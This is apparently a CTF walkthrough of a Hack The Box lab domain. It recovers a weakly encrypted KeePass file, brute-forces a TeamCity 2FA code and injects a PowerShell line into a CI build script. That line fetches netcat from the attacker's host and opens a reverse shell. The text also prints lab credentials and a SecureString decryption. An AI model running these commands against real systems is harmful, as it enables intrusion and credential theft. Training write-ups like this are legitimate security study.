# Host file setup

```python
❯❯❯ sudo nxc smb 10.129.229.190 --generate-hosts-file /etc/hosts                     
[sudo] password for kali: 
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.coder.htb -vv

Nmap scan report for dc01.coder.htb (10.129.229.190)
Host is up, received user-set (0.013s latency).
rDNS record for 10.129.229.190: DC01.coder.htb
Scanned at 2026-11-13 17:09:44 GMT for 12s
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49688/tcp open  unknown          syn-ack
49692/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc01.coder.htb                 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 17:10 +0000
Nmap scan report for dc01.coder.htb (10.129.229.190)
Host is up (0.013s latency).
rDNS record for 10.129.229.190: DC01.coder.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-14 01:10:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Not valid before: 2022-11-04T17:25:43
|_Not valid after:  2032-11-01T17:25:43
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth is enabled but cannot use it to enumerate

The guest account is enabled

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p ''             
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\Guest:
```

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p '' --shares
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\Guest: 
SMB         10.129.229.190  445    DC01             [*] Enumerated shares
SMB         10.129.229.190  445    DC01             Share           Permissions     Remark
SMB         10.129.229.190  445    DC01             -----           -----------     ------
SMB         10.129.229.190  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.190  445    DC01             C$                              Default share
SMB         10.129.229.190  445    DC01             Development     READ            
SMB         10.129.229.190  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.190  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.190  445    DC01             SYSVOL                          Logon server share 
SMB         10.129.229.190  445    DC01             Users           READ          
```

This user has read on `development` and `users`

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p '' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
e.black
c.cage
j.briggs
l.kang
s.blade
svc_teamcity
```

Ill also grab the users

# Development share

```python
❯❯❯ smbclient //dc01.coder.htb/Development -U 'Guest'%''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov  3 15:16:25 2022
  ..                                  D        0  Thu Nov  3 15:16:25 2022
  Migrations                          D        0  Tue Nov  8 22:11:25 2022
  Temporary Projects                  D        0  Fri Nov 11 22:19:03 2022

		6232831 blocks of size 4096. 1013631 blocks available
smb: \>
```

This share looks more interesting

```python
smb: \Temporary Projects\> dir
  .                                   D        0  Fri Nov 11 22:19:03 2022
  ..                                  D        0  Fri Nov 11 22:19:03 2022
  Encrypter.exe                       A     5632  Fri Nov  4 16:51:59 2022
  s.blade.enc                         A     3808  Fri Nov 11 22:17:08 2022

		6232831 blocks of size 4096. 1015003 blocks available
smb: \Temporary Projects\> 
```

Ill switch to the impacket python tool since it has better download functionality

```python
❯❯❯ smbclient.py coder.htb/Guest:''@dc01.coder.htb
# shares
# use Development
# rget *
```

This downloads all the file here

The encrypter is .NET which means i can load it into ILspy

# Reverse engineering of .NET binary

```C#
// AES
using System;
using System.IO;
using System.Security.Cryptography;

internal class AES
{
	public static void Main(string[] args)
	{
		if (args.Length != 1)
		{
			Console.WriteLine("You must provide the name of a file to encrypt.");
			return;
		}
		FileInfo fileInfo = new FileInfo(args[0]);
		string destFile = Path.ChangeExtension(fileInfo.Name, ".enc");
		long value = DateTimeOffset.Now.ToUnixTimeSeconds();
		Random random = new Random(Convert.ToInt32(value));
		byte[] array = new byte[16];
		random.NextBytes(array);
		byte[] array2 = new byte[32];
		random.NextBytes(array2);
		byte[] array3 = EncryptFile(fileInfo.Name, destFile, array2, array);
	}

	private static byte[] EncryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
	{
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			using FileStream stream = new FileStream(destFile, FileMode.Create);
			using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(Key, IV);
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);
			byte[] array = new byte[1024];
			int count;
			while ((count = fileStream.Read(array, 0, array.Length)) != 0)
			{
				cryptoStream.Write(array, 0, count);
			}
		}
		return null;
	}
}
```

This is pretty much all of the application

This is the code its using to encrypt the file

```python
long value = DateTimeOffset.Now.ToUnixTimeSeconds();
Random random = new Random(Convert.ToInt32(value));   
```

This bit of code is the most interesting

> System.Random is a linear congruential generator (LCG), not a CSPRNG. Seeding it with the current Unix timestamp means the 16-byte IV and 32-byte key are fully determined by the second the file was encrypted. If you can recover that timestamp (e.g., from file metadata, logs, or by brute-forcing a small window of nearby seconds), you can reproduce the exact key and IV and decrypt the .enc file.

This essentially means if i can find the exact timestamp it was encrypted i can use that timestamp to decrypt

```python
# ls
drw-rw-rw-          0  Fri Nov 11 22:19:03 2022 .
drw-rw-rw-          0  Fri Nov 11 22:19:03 2022 ..
-rw-rw-rw-       5632  Fri Nov  4 16:58:20 2022 Encrypter.exe
-rw-rw-rw-       3808  Fri Nov 11 22:17:08 2022 s.blade.enc
# 
```

Using the SMB client i can see the date used 

This is synced with my clock though, so ill have to convert it

```python
❯❯❯ date -u -d "Nov 11 22:17:08 2022" +%s
1668205028
```

Then ill create the seed

Then ill get claude to make a C# script

```python
❯❯❯ cat Decryptor.cs 
// Decryptor.cs
// Mirrors encryptor.exe's key/IV derivation and uses the same RijndaelManaged
// defaults, so there's no need to guess block size / padding / mode.
//
// Build:  mcs Decryptor.cs   (or: dotnet build with a minimal csproj)
// Run:    mono Decryptor.exe <path-to-encrypted-file> <unix-timestamp-seconds>
//
// Example: mono Decryptor.exe backup.enc 1700000000

using System;
using System.IO;
using System.Security.Cryptography;

internal class Decryptor
{
    public static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: Decryptor.exe <encrypted_file> <unix_timestamp_seconds>");
            return;
        }

        string sourceFile = args[0];
        long seedValue = long.Parse(args[1]);
        string destFile = Path.ChangeExtension(sourceFile, ".dec");

        // Exactly replicate encryptor.exe's derivation order: seed -> Random -> IV (16) -> Key (32)
        Random random = new Random(Convert.ToInt32(seedValue));
        byte[] iv = new byte[16];
        random.NextBytes(iv);
        byte[] key = new byte[32];
        random.NextBytes(key);

        Console.WriteLine("Seed:  " + seedValue);
        Console.WriteLine("Key:   " + BitConverter.ToString(key).Replace("-", ""));
        Console.WriteLine("IV:    " + BitConverter.ToString(iv).Replace("-", ""));

        try
        {
            DecryptFile(sourceFile, destFile, key, iv);
            Console.WriteLine("Decrypted -> " + destFile);
        }
        catch (CryptographicException ex)
        {
            // Almost always means the seed (timestamp) is wrong, not the code.
            Console.WriteLine("Decryption failed: " + ex.Message);
            Console.WriteLine("If this says 'Padding is invalid', the seed/timestamp is wrong — re-check it.");
        }
    }

    private static void DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        using (FileStream destStream = new FileStream(destFile, FileMode.Create))
        using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(Key, IV))
        using (CryptoStream cryptoStream = new CryptoStream(destStream, transform, CryptoStreamMode.Write))
        using (FileStream srcStream = new FileStream(sourceFile, FileMode.Open))
        {
            byte[] buffer = new byte[1024];
            int count;
            while ((count = srcStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                cryptoStream.Write(buffer, 0, count);
            }
        }
    }
}
```

Once its made the script i can run it

```python
❯❯❯ mcs Decryptor.cs 
❯❯❯ mono Decryptor.exe Temporary\ Projects/s.blade.enc 1668205028
Seed:  1668205028
Key:   0E674FD72BA946B290BE0A5E88672402587129B780DB134808C1EDCE0BFEB48C
IV:    3E65D265E62244DF1F308C6836AD215B
Decrypted -> Temporary Projects/s.blade.dec
```

Then ill compile it and run it on my system with mono

```python
❯❯❯ file s.blade.dec 
s.blade.dec: 7-zip archive data, version 0.4
```

I now have the decryption

# Accessing 7zip archive

After decryption i see its a 7zip archive

```python
❯❯❯ 7z l s.blade.dec 

7-Zip 26.05 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-10-21
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 3799 bytes (4 KiB)

Listing archive: s.blade.dec

--
Path = s.blade.dec
Type = 7z
Physical Size = 3799
Headers Size = 177
Method = LZMA2:12
Solid = -
Blocks = 2

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-11-03 20:02:30 ..H.A         1024         1028  .key
2022-11-11 22:13:55 ....A         2590         2594  s.blade.kdbx
------------------- ----- ------------ ------------  ------------------------
2022-11-11 22:13:55               3614         3622  2 files
```

Looks like these is a .kdbx file

```python
❯❯❯ 7z x s.blade.dec
```

Ill then extract both files

```python
❯❯❯ keepassxc s.blade.kdbx --keyfile .key
```

Ill then use this tool to open the file making sure to supply the key

![](Pasted%20image%2020261115174621.png)

I can now read the DB

```python
Authenticator backup codes:

{
  "6132e897-44a2-4d14-92d2-12954724e83f": {
    "encrypted": true,
    "hash": "6132e897-44a2-4d14-92d2-12954724e83f",
    "index": 1,
    "type": "totp",
    "secret": "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2",
    "issuer": "TeamCity",
    "account": "s.blade"
  },
  "key": {
    "enc": "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1",
    "hash": "$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"
  }
}
```

```python
O365:

s.blade@coder.htb:AmcwNO60Zg3vca3o0HDrTC6D
```

```python
Teamcity:

s.blade:veh5nUSZFFoqz9CrrhSeuwhA

URL: https://teamcity-dev.coder.htb
```

So a few interesting things from this DB

# Domain Credentials

```python
❯❯❯ nxc smb dc01.coder.htb -u users.txt -p 'AmcwNO60Zg3vca3o0HDrTC6D' --continue-on-success  
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [-] coder.htb\Administrator:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\Guest:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\krbtgt:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\DC01$:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\e.black:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\c.cage:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\j.briggs:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\l.kang:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [+] coder.htb\s.blade:AmcwNO60Zg3vca3o0HDrTC6D 
SMB         10.129.229.190  445    DC01             [-] coder.htb\svc_teamcity:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
```

One of the passwords works on the domain for the user `s.blade`

Ive done some quick checks, this user has no access over RDP or WINRM, and there are no kerberoastable or asreproastable users

The user also does not have interesting shares

# Teamcity install

In the .kdbx file therese was a teamcity subdomain

![](Pasted%20image%2020261115175649.png)

The teamcity creds from the kdbx file works but there is 2FA enabled!

# 2FA code brute force

After noticing the site has no rate limiting ill perform a brute force of this code

```python
❯❯❯ seq -w 000000 999999 | tee numbers.txt
```

Ill use the above command to generate every 6-digit permutation possible

Ill then open caido and run an automate task, similar to bursuite's intruder, only the free version of caido has no rate limiting

Ill also raise the worker count, essentially increasing the threads since this could be really quick or it could take a while depending on the code

![](Pasted%20image%2020261116175624.png)

Ill then run the attack, ill filter for code 302 since every failed request shows 200, so its a good chance a valid attempt will be a 302

And after a few minutes i get in

![](Pasted%20image%2020261116175716.png)

Ill have a look around the build

![](Pasted%20image%2020261116180713.png)

![1214](Pasted%20image%2020261116181105.png)

I can see its pulling from a git repo, and executing a file called `hello_world.ps1`

https://exploitnotes.org/exploit/web/teamcity#arbitrary-command-execution-by-custom-script

# Reverse shell as `svc_teamcity`

So at this point i know there is a powershell script that its pulling from the git repo

But i can create a .diff file and upload that, essentially removing the current hello world script to create a reverse shell

```python
❯❯❯ cat hello_world.ps1               
#Simple repo test for Teamcity pipeline
write-host "Hello, World!"
```

I already know what the script looks like because its inside the `development` share

So the plan is to make a diff file to remove the current hello world script and commit the new one, which contains a reverse shell

```python
❯❯❯ cp Migrations/teamcity_test_repo/hello_world.ps1 .
❯❯❯ mkdir evil-repo
❯❯❯ mv hello_world.ps1 evil-repo 
```

Ill start by copying the current hello world script into the current dir

```python
❯❯❯ cd evil-repo
❯❯❯ git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: will change to "main" in Git 3.0. To configure the initial branch name
hint: to use in all of your new repositories, which will suppress this warning,
hint: call:
hint:
hint: 	git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint: 	git branch -m <name>
hint:
hint: Disable this message with "git config set advice.defaultBranchName false"
Initialized empty Git repository in /home/kali/htb/coder/evil-repo/.git/
```

Ill then setup a empty git repo

```python
❯❯❯ git add hello_world.ps1
❯❯❯ git commit -m "evil update"
[master (root-commit) fbd9883] evil update
 1 file changed, 2 insertions(+)
 create mode 100644 hello_world.ps1
```

Now everything is setup

```python
❯❯❯ cat hello_world.ps1 
#Simple repo test for Teamcity pipeline
write-host "Hello, World!"

wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe
C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1337
```

Ill then add the code to fetch netcat from my webserver then send a bind shell

```python
❯❯❯ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
```

Ill then start the listener

```python
❯❯❯ git diff                   
diff --git a/hello_world.ps1 b/hello_world.ps1
index 09724d2..c46669d 100644
--- a/hello_world.ps1
+++ b/hello_world.ps1
@@ -1,2 +1,5 @@
 #Simple repo test for Teamcity pipeline
 write-host "Hello, World!"
+
+wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe
+C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1337
```

Then running git diff i see the output ill be uploading

```python
❯❯❯ git diff | tee evil.diff
```

Ill then run the command again but this time direct it into a diff file

![](Pasted%20image%2020261116184502.png)

Then ill set these options

And run the build

![](Pasted%20image%2020261116184607.png)

And now i have a shell!

However this shell soon dies after the build times out, defender is also running so its not as simple as using a powershell reverse shell

```python
❯❯❯ rlwrap nc -lnvp 1338
listening on [any] 1338 ...
```

Ill open another listener on port 1338

Then ill re run the process to get the initial shell

```python
❯❯❯ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.229.190] 63914
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\TeamCity\buildAgent\work\74c2f03019966b3e> wmic process call create "C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1338"
wmic process call create "C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1338"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
	ProcessId = 5296;
	ReturnValue = 0;
};

PS C:\TeamCity\buildAgent\work\74c2f03019966b3e> 
```

Then after getting the shell ill use wmic to run netcat under another process, this means that when this process times out the new shell on port 1338 should remain alive

```python
❯❯❯ rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.229.190] 63915
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
coder\svc_teamcity
PS C:\Windows\system32> whoami
whoami
coder\svc_teamcity
PS C:\Windows\system32> 
```

Then after 2 or so minutes the initial shell on port 1337 dies but this shell remains alive!

> This launches `nc64.exe` as a child of **`wmiprvse.exe`** (WMI Provider Host, a service), so it's completely detached from your parent process tree. When your parent dies at 2 minutes, nc keeps running.

# Lateral movement to `e.black`

```python
PS C:\ProgramData\JetBrains\TeamCity\system\changes> dir
dir


    Directory: C:\ProgramData\JetBrains\TeamCity\system\changes


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        11/8/2022   2:18 PM           1707 101.changes.diff                                                      
-a----       11/17/2026   5:41 PM            325 201.changes.diff                                                      
-a----       11/17/2026   5:47 PM            325 202.changes.diff                                                      


PS C:\ProgramData\JetBrains\TeamCity\system\changes>
```

The most recent files are the diff files that got me a shell

```python
PS C:\ProgramData\JetBrains\TeamCity\system\changes> type 101.changes.diff
type 101.changes.diff
diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1
index d6515ce..a990b2e 100644
--- a/Get-ADCS_Report.ps1
+++ b/Get-ADCS_Report.ps1
@@ -77,11 +77,15 @@ Function script:send_mail {
     [string]
     $subject
   )
+
+$key = Get-Content ".\key.key"
+$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
+$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
 $emailFrom = 'pkiadmins@coder.htb'
 $emailCC = 'e.black@coder.htb'
 $emailTo = 'itsupport@coder.htb'
 $smtpServer = 'smtp.coder.htb'
-Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High
+Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High -Credential $cred
 }
 
 
diff --git a/enc.txt b/enc.txt
new file mode 100644
index 0000000..d352634
--- /dev/null
+++ b/enc.txt
@@ -0,0 +1,2 @@
+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN
+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==
diff --git a/key.key b/key.key
new file mode 100644
index 0000000..a6285ed
--- /dev/null
+++ b/key.key
@@ -0,0 +1,32 @@
+144
+255
+52
+33
+65
+190
+44
+106
+131
+60
+175
+129
+127
+179
+69
+28
+241
+70
+183
+53
+153
+196
+10
+126
+108
+164
+172
+142
+119
+112
+20
+122
```

But the older one shows some interesting data

Its clear its using the file `enc.txt` and the key to decrypt the value then using that to auth as `e.black` and send an email to `itsupport`

After looking at it, it looks like i can extract both from the output

```python
76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==
```

This is enc.txt

```python
144
255
52
33
65
190
44
106
131
60
175
129
127
179
69
28
241
70
183
53
153
196
10
126
108
164
172
142
119
112
20
122
```

And this is the key

Ill create copies on my system and transfer them over

```python
PS C:\ProgramData> wget http://10.10.14.61/enc.txt -o enc.txt
wget http://10.10.14.61/enc.txt -o enc.txt
PS C:\ProgramData> wget http://10.10.14.61/key.key -o key.key
wget http://10.10.14.61/key.key -o key.key
```

Ill get both files on the target

```python
PS C:\ProgramData> $key = Get-Content ".\key.key"
$key = Get-Content ".\key.key"
PS C:\ProgramData> $pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
PS C:\ProgramData> $cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
PS C:\ProgramData> $read = $cred.GetNetworkCredential().Password
$read = $cred.GetNetworkCredential().Password
PS C:\ProgramData> echo $read
echo $read
ypOSJXPqlDOxxbQSfEERy300
PS C:\ProgramData> 
```

Then ill just repeat the first three steps found in the .diff file then use `GetNetworkCredential` to read the password

# Access as `e.black`

```python
❯❯❯ nxc smb dc01.coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'                                          
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\e.black:ypOSJXPqlDOxxbQSfEERy300
```

This user is now compromised!

```python
❯❯❯ nxc winrm dc01.coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'
WINRM       10.129.229.190  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:coder.htb) 
WINRM       10.129.229.190  5985   DC01             [+] coder.htb\e.black:ypOSJXPqlDOxxbQSfEERy300 (Pwn3d!)
```

This user also has access over winrm!

```python
❯❯❯ python3 venv/bin/evil-winrm-py -i dc01.coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'                         
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc01.coder.htb:5985' as 'e.black'
evil-winrm-py PS C:\Users\e.black\Documents> cd ../Desktop
evil-winrm-py PS C:\Users\e.black\Desktop> dir


    Directory: C:\Users\e.black\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---       11/18/2026   4:33 PM             34 user.txt                                                               


evil-winrm-py PS C:\Users\e.black\Desktop>
```

And now its at this point where i can get the user flag

```python
❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300' get membership 'e.black'

distinguishedName: CN=Users,CN=Builtin,DC=coder,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=coder,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=coder,DC=htb
objectSid: S-1-5-21-2608251805-3526430372-1546376444-513
sAMAccountName: Domain Users

